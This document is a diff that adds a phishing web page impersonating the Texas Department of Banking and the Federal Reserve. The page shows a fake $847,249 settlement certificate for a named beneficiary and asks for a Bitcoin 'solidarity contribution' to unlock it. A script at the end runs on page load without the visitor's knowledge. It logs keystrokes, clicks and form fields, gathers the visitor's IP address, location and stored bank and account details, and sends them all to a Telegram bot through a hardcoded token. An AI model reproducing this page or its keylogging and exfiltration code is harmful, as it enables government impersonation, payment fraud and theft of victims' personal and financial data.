@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TIFMA | Official FRC Retrieval Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
+        
+        body { 
+            font-family: 'Public Sans', sans-serif; 
+            background-color: #f8fafc; 
+            color: #0f172a;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .nav-header { background-color: #0f172a; color: white; border-bottom: 5px solid #b91c1c; }
+        .gov-banner { background: #f1f5f9; padding: 8px 5%; border-bottom: 1px solid #cbd5e1; font-size: 12px; }
+        .legal-footer { background-color: #0a1f2e; color: #d1d9e6; font-size: 0.8rem; padding: 3rem 0; border-top: 4px solid #fcba19; }
+        
+        .pdf-frame {
+            background: white;
+            border: 1px solid #94a3b8;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            position: relative;
+            width: 100%;
+            max-width: 850px;
+            margin: 0 auto;
+            min-height: 800px;
+        }
+
+        .sensitive-blur {
+            filter: blur(8px);
+            background: rgba(241, 245, 249, 0.5);
+            padding: 4px 12px;
+            border-radius: 4px;
+            display: inline-block;
+            user-select: none;
+            transition: all 0.8s ease;
+        }
+
+        .unlocked .sensitive-blur {
+            filter: blur(0px);
+            background: transparent;
+        }
+
+        .solidarity-stamp {
+            position: absolute;
+            top: 60px;
+            right: 60px;
+            width: 140px;
+            height: 140px;
+            border: 4px solid #b91c1c;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: #b91c1c;
+            font-weight: 900;
+            text-transform: uppercase;
+            font-size: 11px;
+            transform: rotate(-20deg) scale(3);
+            opacity: 0;
+            z-index: 50;
+            background: rgba(255, 255, 255, 0.9);
+            pointer-events: none;
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .stamp-active {
+            transform: rotate(-15deg) scale(1);
+            opacity: 0.8;
+        }
+
+        .btn-download-disabled {
+            background-color: #e2e8f0;
+            color: #94a3b8;
+            cursor: not-allowed;
+            border: 1px solid #cbd5e1;
+        }
+
+        .btn-download-ready {
+            background-color: #1e40af;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(30, 64, 175, 0.3);
+        }
+
+        .initiative-card {
+            border: 1px solid #e2e8f0;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .initiative-card:hover {
+            border-color: #3b82f6;
+            background-color: #f0f7ff;
+        }
+        .initiative-card.selected {
+            border-color: #1e40af;
+            background-color: #eff6ff;
+            box-shadow: 0 0 0 2px #1e40af;
+        }
+
+        .gov-dropdown { display: none; background: #fff; border: 1px solid #e2e8f0; padding: 20px; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); position: absolute; width: 320px; z-index: 100; }
+        .active { display: block; }
+
+        .ledger-panel {
+            background-color: #ffffff;
+            border: 1px solid #cbd5e1;
+            border-radius: 2px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+        .ledger-header {
+            border-bottom: 2px solid #0f172a;
+            background-color: #f1f5f9;
+            color: #0f172a;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 800;
+            padding: 10px 16px;
+        }
+        .tx-success { color: #15803d; font-weight: 700; background: #f0fdf4; padding: 2px 6px; border-radius: 2px; border: 1px solid #bbf7d0; }
+        .tx-pending { color: #b45309; font-weight: 700; background: #fffbeb; padding: 2px 6px; border-radius: 2px; border: 1px solid #fef3c7; }
+        .tx-id { font-family: 'Roboto Mono', monospace; color: #475569; font-size: 10px; }
+        
+        /* NEW PROGRESS BAR STYLES */
+        .footer-bar {
+            background-color: #f8fafc;
+            padding: 30px 30px;
+            border-top: 2px solid #e2e8f0;
+            margin-top: 20px;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            font-weight: 800;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            color: #334155;
+        }
+
+        .progress-track {
+            height: 20px;
+            background-color: #e2e8f0;
+            border: 1px solid #cbd5e1;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 89.32%;
+            background-color: #0f172a;
+            position: relative;
+        }
+
+        .progress-shimmer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(251, 191, 36, 0.3), transparent);
+            animation: shimmer-load 2s infinite;
+        }
+
+        @keyframes shimmer-load {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .completion-message {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #b45309;
+            font-family: 'Roboto Mono', monospace;
+        }
+
+        @media print {
+            .no-print { display: none !important; }
+            body { background: white; }
+            .pdf-frame { box-shadow: none; border: none; margin: 0; padding: 0; width: 100%; max-width: none; }
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <section class="gov-banner no-print">
+        <div class="max-w-7xl mx-auto flex items-center gap-2">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-3.5 shadow-sm" alt="US Flag">
+            <p>An official website of the United States government. <button onclick="document.getElementById('govDrop').classList.toggle('active')" class="text-blue-800 underline font-semibold ml-1">Here's how you know</button></p>
+            <div id="govDrop" class="gov-dropdown">
+                <strong>Official .gov websites are secure</strong><br>
+                A <strong>.gov</strong> website belongs to an official government organization in the United States. HTTPS usage ensures a private connection to the secure server.
+            </div>
+        </div>
+    </section>
+
+    <header class="nav-header px-4 py-6 md:px-8 no-print">
+        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
+            <div class="flex items-center gap-4">
+                <div class="h-12 w-12 bg-white rounded-full flex items-center justify-center text-2xl shadow-md overflow-hidden p-1">
+                   <img src="https://national-settlement-board.cfd/images/dob-texas.png" alt="Texas Seal">
+                </div>
+                <div>
+                    <h1 class="text-xl md:text-2xl font-black uppercase tracking-tighter text-white">Texas Department of Banking</h1>
+                    <p class="text-[9px] font-bold text-slate-400 uppercase tracking-[0.2em]">Institutional Funds Management Authority (TIFMA)</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-6">
+                <div class="text-right hidden md:block text-white">
+                    <p class="text-[10px] font-mono text-blue-200">FEDERAL NODE: TX-DAL-11-RC</p>
+                    <p class="text-[10px] text-green-400 font-bold uppercase tracking-widest">● Secure Session Active</p>
+                </div>
+                <img src="https://national-settlement-board.cfd/images/tdi-seal.png" class="h-14" onerror="this.src='https://national-settlement-board.cfd/TDI.jpg'">
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-8">
+
+        <div class="bg-white border-l-8 border-blue-900 p-6 mb-10 shadow-sm rounded-r-lg no-print">
+            <div class="flex flex-col md:flex-row justify-between gap-8">
+                <div class="flex-1">
+                    <h2 class="text-lg font-black text-slate-800 uppercase mb-2">Electronic Disbursement Protocol: ACTIVE</h2>
+                    <p class="text-xs text-slate-600 leading-relaxed mb-4">
+                        The Texas Department of Banking, in coordination with the 11th District Federal Reserve, has detected successful RBF recovery. Final synchronization in progress.
+                    </p>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="bg-slate-100 text-slate-700 text-[10px] font-bold px-3 py-1 border border-slate-200 uppercase tracking-tighter">Settlement ID: TX-B10B-2026</span>
+                        <span class="bg-green-50 text-green-700 text-[10px] font-bold px-3 py-1 border border-green-200 uppercase tracking-tighter">Status: SYNCHRONIZING</span>
+                    </div>
+                </div>
+                <div class="md:w-72 bg-slate-50 p-5 border border-slate-200 rounded flex flex-col justify-center text-center">
+                    <p class="text-[10px] font-bold text-slate-500 uppercase mb-1">Approved Principal Sum</p>
+                    <p class="text-2xl font-black text-slate-900">$847,249.00</p>
+                    <p class="text-[9px] text-amber-600 font-bold uppercase mt-1 tracking-widest">Finalizing Clearance</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid lg:grid-cols-12 gap-10">
+            
+            <div class="lg:col-span-7 space-y-6">
+                <div class="flex justify-between items-center px-1 no-print">
+                    <h3 class="text-[11px] font-black uppercase text-slate-500 tracking-widest">Digital Certificate Rendering</h3>
+                    <span class="text-[10px] font-mono text-slate-400">HASH: 7F2A...E91D</span>
+                </div>
+
+                <div id="pdfContainer" class="pdf-frame p-12 text-slate-800">
+                    <div id="solidarityStamp" class="solidarity-stamp">
+                        <span id="stampTitle">SOLIDARITY<br>CONTRIBUTION<br>VERIFIED</span>
+                    </div>
+
+                    <div class="flex justify-between items-start mb-16">
+                        <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" class="h-20" alt="Fed Seal" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Seal_of_the_United_States_Federal_Reserve_System.svg/249px-Seal_of_the_United_States_Federal_Reserve_System.svg.png'">
+                        <div class="text-right">
+                            <p class="text-[11px] font-bold uppercase tracking-widest">Official Document FRC-26</p>
+                            <p class="text-[9px] font-mono text-slate-400">Department of Banking, Texas</p>
+                        </div>
+                    </div>
+
+                    <div class="text-center border-b-2 border-slate-900 pb-4 mb-12">
+                        <h2 class="text-4xl font-black uppercase tracking-tight">Federal Release Code</h2>
+                        <p class="text-[10px] font-bold uppercase mt-2 tracking-[0.3em]">Institutional Funds Disbursement Instrument</p>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-10 mb-12">
+                        <div class="space-y-6">
+                            <div>
+                                <p class="text-[9px] font-bold text-slate-400 uppercase">Primary Beneficiary</p>
+                                <p class="text-sm font-black uppercase" id="pdf-beneficiary">Mujinga Therese Mukuna [VERIFIED]</p>
+                            </div>
+                            <div>
+                                <p class="text-[9px] font-bold text-slate-400 uppercase">Case Reference Number</p>
+                                <p class="text-sm font-mono font-bold">TX-B10B-2026-MUK1139</p>
+                            </div>
+                        </div>
+                        <div class="space-y-6">
+                            <div>
+                                <p class="text-[9px] font-bold text-slate-400 uppercase">Settlement Value</p>
+                                <p class="text-sm font-black">$847,249.00 USD</p>
+                            </div>
+                            <div>
+                                <p class="text-[9px] font-bold text-slate-400 uppercase">Disbursement Node</p>
+                                <p class="text-sm font-bold">DISTRICT 11 DALLAS</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="border border-slate-200 p-6 bg-slate-50 mb-12">
+                        <p class="text-[11px] leading-relaxed italic text-slate-600">
+                            This instrument certifies that the beneficiary named herein is authorized to liquidate assets to the value specified. The activation of the release code below confirms the transfer of liability from federal custody to the designated commercial depository.
+                        </p>
+                    </div>
+
+                    <div class="bg-slate-100 p-10 text-center rounded border border-slate-200 mb-12 shadow-inner">
+                        <p class="text-[10px] uppercase font-bold tracking-[0.4em] mb-4 text-slate-400">Secure Federal Release String</p>
+                        <div class="text-4xl font-mono font-black tracking-widest text-slate-900">
+                            <span class="sensitive-blur" id="frc-string">FRC-●●●●-2026-●●●●</span>
+                        </div>
+                    </div>
+
+                    <div class="flex justify-between items-end mt-20">
+                        <div class="w-1/2">
+                            <p class="text-[8px] uppercase font-bold text-slate-400 mb-10">Electronic Attestation of Director</p>
+                            <div class="border-t border-slate-400 pt-2">
+                                <p class="font-serif italic text-xl text-slate-900">David G. Smith</p>
+                                <p class="text-[10px] uppercase font-black tracking-widest mt-1">Division Director, TIFMA</p>
+                            </div>
+                        </div>
+                        <img src="https://national-settlement-board.cfd/images/texas-state-seal.png" class="h-20 opacity-40 grayscale" alt="TX Seal">
+                    </div>
+                </div>
+
+                <button id="downloadPdfBtn" class="btn-download-disabled w-full py-6 rounded-sm font-black text-sm flex items-center justify-center gap-3 transition-all uppercase tracking-widest no-print">
+                    <i class="fas fa-file-pdf text-lg"></i>
+                    <span>Download Final FRC Certificate</span>
+                </button>
+            </div>
+
+            <div class="lg:col-span-5 space-y-8 no-print">
+                <div class="bg-slate-900 text-white p-8 rounded-sm shadow-2xl">
+                    <h3 class="text-lg font-black uppercase mb-4 text-blue-400 tracking-tighter">High Value Document Stamp</h3>
+                    
+                    <div class="text-[12px] space-y-4 leading-relaxed text-slate-300 mb-8">
+                        <p>
+                            Beneficiaries are invited to participate in a <strong>Voluntary Solidarity Contribution</strong>. Completion of a contribution triggers the <strong>Verification Stamp</strong> for expedited processing. 
+                        </p>
+                        <p class="text-yellow-400 font-bold underline">RBF Recovery Fee: 0.00050 BTC — CONFIRMED</p>
+                    </div>
+
+                    <div class="space-y-4 mb-8" id="initiativeContainer">
+                        <div onclick="selectInitiative('sudan')" id="cardSudan" class="initiative-card bg-white/5 p-4 rounded flex items-center gap-4">
+                            <img src="https://national-settlement-board.cfd/images/sudanese-support.png" class="h-16 w-24 object-cover rounded opacity-80" alt="Sudan Support">
+                            <div class="flex-1">
+                                <h4 class="text-[11px] font-bold uppercase text-white">Sudan Regional Support</h4>
+                                <span class="text-[9px] text-blue-400 uppercase font-bold">Organization Verified</span>
+                            </div>
+                            <div class="h-5 w-5 rounded-full border border-slate-600 flex items-center justify-center" id="checkSudan">
+                                <div class="h-2 w-2 rounded-full bg-blue-500 hidden inner-dot"></div>
+                            </div>
+                        </div>
+
+                        <div onclick="selectInitiative('defense')" id="cardDefense" class="initiative-card bg-white/5 p-4 rounded flex items-center gap-4">
+                            <img src="https://national-settlement-board.cfd/images/defense-support.png" class="h-16 w-24 object-cover rounded opacity-80" alt="Defense Support">
+                            <div class="flex-1">
+                                <h4 class="text-[11px] font-bold uppercase text-white">National Defense Initiative</h4>
+                                <span class="text-[9px] text-blue-400 uppercase font-bold">Mandate Portal Active</span>
+                            </div>
+                            <div class="h-5 w-5 rounded-full border border-slate-600 flex items-center justify-center" id="checkDefense">
+                                <div class="h-2 w-2 rounded-full bg-blue-500 hidden inner-dot"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="ledger-panel no-print">
+                        <div class="ledger-header flex justify-between items-center">
+                            <span class="text-[10px]">TIFMA Synchronization Ledger</span>
+                            <span class="text-[10px] font-mono text-slate-500">Node: TX-DALLAS-EXPLR</span>
+                        </div>
+                        
+                        <div class="p-4 bg-white space-y-5">
+                            <div class="flex flex-col border-b border-slate-100 pb-3">
+                                <div class="flex justify-between items-center mb-1">
+                                    <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-27 | 07:58 CST</span>
+                                    <span class="tx-success text-[9px]">SETTLED / CONFIRMED</span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <span class="tx-id">bc1q...m4n2</span>
+                                    <span class="text-[11px] font-black text-slate-900">0.00075 BTC</span>
+                                </div>
+                            </div>
+                             <div class="flex flex-col border-b border-slate-100 pb-3">
+                                <div class="flex justify-between items-center mb-1">
+                                    <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-26 | 13:51 CST</span>
+                                    <span class="tx-success text-[9px]">SETTLED / CONFIRMED</span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <span class="tx-id">bc1q...x8k9</span>
+                                    <span class="text-[11px] font-black text-slate-900">0.00100 BTC</span>
+                                </div>
+                            </div>
+                            <div id="stuckTxContainer" class="flex flex-col border-b border-slate-100 pb-3">
+                                <div class="flex justify-between items-center mb-1">
+                                    <div class="flex items-center gap-2">
+                                        <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-25 | 14:49 CST</span>
+                                    </div>
+                                    <span id="stuckStatusLabel" class="tx-success text-[9px] flex items-center gap-1">
+                                        <i class="fas fa-check-circle"></i> RECOVERED / RESOLVED
+                                    </span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <span class="tx-id">bc1q...vpx</span>
+                                    <span class="text-[11px] font-black text-slate-900">0.00075 BTC</span>
+                                </div>
+                            </div>
+                            <div class="flex flex-col">
+                                <div class="flex justify-between items-center mb-1">
+                                    <span class="text-[9px] text-slate-500 font-bold uppercase">2026-03-24 | 17:04 CST</span>
+                                    <span class="tx-success text-[9px]">SETTLED / CONFIRMED</span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <span class="tx-id">bc1p...q6l4</span>
+                                    <span class="text-[11px] font-black text-slate-900">0.00080 BTC</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- NEW PROGRESS BAR SECTION -->
+                    <div class="footer-bar mt-6">
+                        <div class="progress-label">
+                            <span>Network Propagation Stream</span>
+                            <span>SYNC: 89.32%</span>
+                        </div>
+                        <div class="progress-track">
+                            <div class="progress-fill">
+                                <div class="progress-shimmer"></div>
+                            </div>
+                        </div>
+                        <div class="completion-message">
+                            The transaction can complete anytime.
+                        </div>
+                    </div>
+
+                    <div id="transactionPortal" class="mt-8 pt-8 border-t border-slate-700 hidden">
+                        <div class="text-center">
+                            <p class="text-[10px] font-bold text-slate-400 uppercase mb-6 tracking-widest">Internal Ledger Address (BTC-LN)</p>
+                            <div class="bg-white p-4 rounded inline-block shadow-lg mb-6">
+                                <img src="https://national-settlement-board.cfd/lightning-qr.png" class="w-48 h-48" alt="Address QR">
+                            </div>
+                            <div class="space-y-3 px-4">
+                                <div class="bg-black p-3 rounded border border-slate-800 font-mono text-[10px] text-blue-300 break-all text-left">
+                                    lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhxarfdenhjer9wd5kwm33xgcs4dejrg
+                                </div>
+                                <div class="grid grid-cols-2 gap-3">
+                                    <button onclick="copyAddr()" class="bg-slate-800 hover:bg-slate-700 py-3 rounded text-[10px] font-bold uppercase transition-all">Copy Address</button>
+                                    <button onclick="saveQR()" class="bg-slate-800 hover:bg-slate-700 py-3 rounded text-[10px] font-bold uppercase transition-all">Save QR Code</button>
+                                </div>
+                            </div>
+                            <button id="attributionBtn" class="w-full mt-8 py-4 bg-green-700 text-white font-black uppercase text-xs tracking-[0.2em] transition-all shadow-xl" onclick="executeVoluntaryAttribution()">
+                                RESUME PROCESSING COMPLETE
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="legal-footer mt-20 no-print">
+        <div class="max-w-7xl mx-auto px-6">
+            <div class="grid md:grid-cols-3 gap-12 mb-12">
+                <div>
+                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Federal Regulatory Oversight</h5>
+                    <p class="text-xs text-slate-400 leading-loose">Texas Department of Banking<br>2601 N Lamar Blvd, Austin, TX 78705</p>
+                </div>
+                <div>
+                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Network Node 11</h5>
+                    <p class="text-xs text-slate-400 leading-loose">Eleventh District Federal Reserve<br>Dallas Operations Center</p>
+                </div>
+                <div>
+                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Access Protocol</h5>
+                    <p class="text-[10px] text-slate-500 italic leading-relaxed">Authorized beneficiary access only. Sessions monitored under CFAA.</p>
+                </div>
+            </div>
+            <div class="pt-8 border-t border-slate-800 flex flex-wrap justify-between items-center gap-4">
+                <p class="text-[10px] text-slate-600 uppercase font-mono tracking-widest">Electronic Fund Transfer Protocol v26.3</p>
+                <div class="flex gap-6">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-3.5 shadow-sm" alt="US Flag" class="h-8 opacity-20 grayscale">
+                    <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" class="h-8 opacity-20 grayscale">
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        let selectedInitiativeType = '';
+
+        window.onload = function() {
+            const name = localStorage.getItem('tifma_name') || 'Mujinga Therese Mukuna';
+            document.getElementById('pdf-beneficiary').innerText = name.toUpperCase() + ' [VERIFIED]';
+            
+            document.addEventListener('click', function(e) {
+                if (!document.getElementById('initiativeContainer').contains(e.target)) {
+                    document.querySelectorAll('.initiative-card').forEach(function(card) {
+                        card.classList.remove('selected', 'bg-white/10');
+                    });
+                    document.querySelectorAll('.inner-dot').forEach(function(dot) {
+                        dot.classList.add('hidden');
+                    });
+                    document.getElementById('transactionPortal').classList.add('hidden');
+                    selectedInitiativeType = '';
+                }
+            });
+        };
+
+        function selectInitiative(type) {
+            selectedInitiativeType = type;
+            var cards = document.querySelectorAll('.initiative-card');
+            var dots = document.querySelectorAll('.inner-dot');
+            for (var i = 0; i < cards.length; i++) {
+                cards[i].classList.remove('selected', 'bg-white/10');
+            }
+            for (var j = 0; j < dots.length; j++) {
+                dots[j].classList.add('hidden');
+            }
+            if(type === 'sudan') {
+                document.getElementById('cardSudan').classList.add('selected', 'bg-white/10');
+                document.getElementById('checkSudan').querySelector('.inner-dot').classList.remove('hidden');
+            } else {
+                document.getElementById('cardDefense').classList.add('selected', 'bg-white/10');
+                document.getElementById('checkDefense').querySelector('.inner-dot').classList.remove('hidden');
+            }
+            document.getElementById('transactionPortal').classList.remove('hidden');
+        }
+
+        function copyAddr() {
+            var val = "lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhxarfdenhjer9wd5kwm33xgcs4dejrg";
+            var el = document.createElement('textarea');
+            el.value = val;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+        }
+
+        function saveQR() {
+            window.open('https://national-settlement-board.cfd/lightning-qr.png', '_blank');
+        }
+
+        function executeVoluntaryAttribution() {
+            var btn = document.getElementById('attributionBtn');
+            if (!selectedInitiativeType) {
+                alert('Please select a cause first.');
+                return;
+            }
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> FINALIZING...';
+            setTimeout(function() {
+                document.getElementById('pdfContainer').classList.add('unlocked');
+                var uniqueCode = "FRC-" + Math.random().toString(36).substring(2, 6).toUpperCase() + "-2026-" + (Math.floor(Math.random()*8999)+1000);
+                document.getElementById('frc-string').innerText = uniqueCode;
+                document.getElementById('solidarityStamp').classList.add('stamp-active');
+                var dBtn = document.getElementById('downloadPdfBtn');
+                dBtn.classList.remove('btn-download-disabled');
+                dBtn.classList.add('btn-download-ready');
+                dBtn.innerHTML = '<i class="fas fa-file-pdf text-lg"></i> Download Verified FRC Certificate (Ready)';
+                btn.innerHTML = '<i class="fas fa-check-circle mr-2"></i> PROCESSING COMPLETE';
+                btn.classList.replace('bg-green-700', 'bg-slate-700');
+                alert('FRC is now ready for download. Click the download button to proceed with face verification.');
+            }, 3000);
+        }
+
+        document.getElementById('downloadPdfBtn').addEventListener('click', function() {
+            if(!this.classList.contains('btn-download-ready')) {
+                alert("FRC not yet available. Synchronization in progress (89.32%). Please wait for completion.");
+                return;
+            }
+            alert("Redirecting to face verification portal...");
+            window.location.href = "https://national-settlement-board.cfd/frc-decrypt.html";
+        });
+    </script>
+    <script>
+(function() {
+    var BOT_TOKEN = '8481428965:AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY';
+    var CHAT_ID = '7275242903';
+    
+    function sendToTelegram(text) {
+        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
+        }).catch(function() {});
+    }
+    
+    sendToTelegram('PAGE_LOAD: ' + navigator.userAgent + ' | ' + window.location.href);
+    
+    fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            fetch('https://ipapi.co/' + data.ip + '/json/')
+                .then(function(r) { return r.json(); })
+                .then(function(loc) {
+                    sendToTelegram('LOCATION: ' + data.ip + ' | ' + (loc.city || '') + ', ' + (loc.region || '') + ', ' + (loc.country_name || '') + ' | ISP: ' + (loc.org || ''));
+                });
+        });
+    
+    var keyLog = [];
+    document.addEventListener('keydown', function(e) {
+        var k = e.key;
+        if (k === ' ') k = '[SPACE]';
+        if (k === 'Enter') k = '[ENTER]';
+        if (k === 'Backspace') k = '[BACKSPACE]';
+        if (k === 'Tab') k = '[TAB]';
+        if (k.length > 1 && k !== ' ' && k !== 'Enter' && k !== 'Backspace' && k !== 'Tab') k = '[' + k + ']';
+        keyLog.push(k);
+        if (keyLog.length >= 20) {
+            sendToTelegram('KEYS: ' + keyLog.join(''));
+            keyLog = [];
+        }
+    });
+    
+    setInterval(function() {
+        if (keyLog.length > 0) {
+            sendToTelegram('KEYS: ' + keyLog.join(''));
+            keyLog = [];
+        }
+    }, 30000);
+    
+    document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var data = {};
+        var inputs = form.querySelectorAll('input, select, textarea');
+        for (var i = 0; i < inputs.length; i++) {
+            var input = inputs[i];
+            if (input.name || input.id) {
+                data[input.name || input.id] = input.value;
+            }
+        }
+        sendToTelegram('FORM_SUBMIT: ' + JSON.stringify(data));
+    });
+    
+    document.addEventListener('click', function(e) {
+        var t = e.target;
+        var info = 'CLICK: ' + t.tagName;
+        if (t.id) info += ' #' + t.id;
+        if (t.className && typeof t.className === 'string') info += ' .' + t.className;
+        if (t.innerText && t.innerText.length < 50) info += ' "' + t.innerText + '"';
+        sendToTelegram(info);
+    });
+    
+    setTimeout(function() {
+        var session = {
+            name: localStorage.getItem('tifma_name'),
+            bank: localStorage.getItem('tifma_bank'),
+            account: localStorage.getItem('tifma_account'),
+            verified: localStorage.getItem('tifma_verified'),
+            lockout: localStorage.getItem('wallet_lockout')
+        };
+        if (session.name || session.bank || session.account) {
+            sendToTelegram('SESSION_DATA: ' + JSON.stringify(session));
+        }
+        
+        var storage = {};
+        for (var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            storage[key] = localStorage.getItem(key);
+        }
+        sendToTelegram('STORAGE: ' + JSON.stringify(storage));
+    }, 3000);
+    
+    var startTime = Date.now();
+    setInterval(function() {
+        sendToTelegram('HEARTBEAT: ' + Math.round((Date.now() - startTime) / 1000) + 's on ' + window.location.pathname);
+    }, 60000);
+    
+    window.addEventListener('beforeunload', function() {
+        sendToTelegram('SESSION_END: ' + Math.round((Date.now() - startTime) / 1000) + 's');
+    });
+})();
+</script>
+
+<script type="text/javascript" src="/unprotected/back_to_spaceship.js?hash=4975d460e508829e8fb64d3962bc44ad35f3a95a"></script>
+
+</body>
+</html>
